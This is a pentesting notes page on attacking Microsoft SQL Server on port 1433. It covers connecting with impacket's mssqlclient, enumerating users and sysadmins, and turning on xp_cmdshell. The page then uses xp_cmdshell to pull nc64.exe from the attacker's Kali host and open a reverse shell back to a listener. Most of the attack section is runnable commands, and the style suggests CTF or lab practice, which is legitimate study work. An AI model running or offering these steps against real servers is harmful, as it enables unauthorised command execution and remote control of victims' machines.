---
title: 1433 msSQL
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting,windows,impacket
---

# 1433 msSQL

## Connect to a remote Microsoft SQL database

For that, we can use a package such as [impacket](impacket.md) and, specifically, the module mssqlclient.py module that you can find in the folder examples:

```bash
python3 mssqlclient.py username:password@targetIP -windows-auth
# With python3 mssqlclient.py help you can see more options.
```

## Basic commands

```
# Get Microsoft SQL server version
select @@version;

# Get usernames
select user_name();

# Get databases
SELECT name FROM master.dbo.sysdatabases;

# Get current database
SELECT DB_NAME();

# Get a list of users in the domain
SELECT name FROM master..syslogins

# Get a list of users that are sysadmins
 SELECT name FROM master..syslogins WHERE sysadmin = 1;

# And to make sure: 
SELECT is_srvrolemember(‘sysadmin’); 
# If your user is admin, it will return 1.
```

## Executing cmd shell in a SQL command line

Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command **xp_cmdshell**, that will allow us to use the SQL command line as a CLI. 

Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default. But we can use sp_configure or Policy Based Management to enable it. 

**sp_configure** displays or changes global configuration settings for the current settings. This is how you may take advantage of it:

```msSQL
# To allow advanced options to be changed.   
EXECUTE sp_configure 'show advanced options', 1;  
  
# To update the currently configured value for advanced options.  
RECONFIGURE;  

# To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
  
# To update the currently configured value for this feature.  
RECONFIGURE;  
```

Now we can use the msSQL terminal to execute commands:

```msSQL
# This will return the .exe files existing in the current directory
EXEC xp_cmdshell 'dir *.exe';

# To print a file
EXECUTE xp_cmdshell 'type c:\Users\sql_svc\Desktop\user.txt

# With this (and a "python3 -m http.server 80" from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe";

# We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a "nc -lnvp 443". When launching the reverse shell, we'll get a powershell terminal in this tab by running:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443";
# You could also upload winPEAS and run it from this powershell command line
```


## Sources and resources

+ [Impacket](impacket.md): mssqlclient.py.  
+ [Pentesmonkey Cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet).
+ [book.hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server).
+ [winPEAS](winpeas.md).



